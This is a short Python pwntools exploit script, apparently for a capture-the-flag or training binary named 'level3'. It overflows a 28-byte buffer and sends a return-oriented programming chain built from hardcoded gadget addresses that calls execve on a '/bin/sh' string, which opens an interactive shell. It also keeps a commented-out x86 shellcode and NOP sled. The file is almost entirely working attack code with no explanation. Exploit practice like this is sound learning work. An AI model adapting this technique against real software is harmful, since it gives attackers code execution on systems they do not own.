from pwn import *

context.log_level = 'debug'
context.local(endian='big')



length_to_override = 28
#shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
#nopsled = "\x90"*200
zero_edx = "\xb5\x84\x04\x08"
push_eax = "\xb8\x84\x04\x08"
pop_ebx = "\xc2\x84\x04\x08"
pop_ecx = "\xc0\x84\x04\x08"
execve_eax = "\xba\x84\x04\x08"
syscall = "\xb3\x84\x04\x08"
txt_bin_sh = "\xc0\x85\x04\x08"

rop_chain =  pop_ebx + txt_bin_sh + zero_edx + execve_eax + syscall
payload = cyclic(length_to_override) + rop_chain


p = process("./level3")
p.recvuntil("That won't work this time!\n", timeout=0)
pause()

p.sendline(payload)

p.interactive()
#p.recvall()
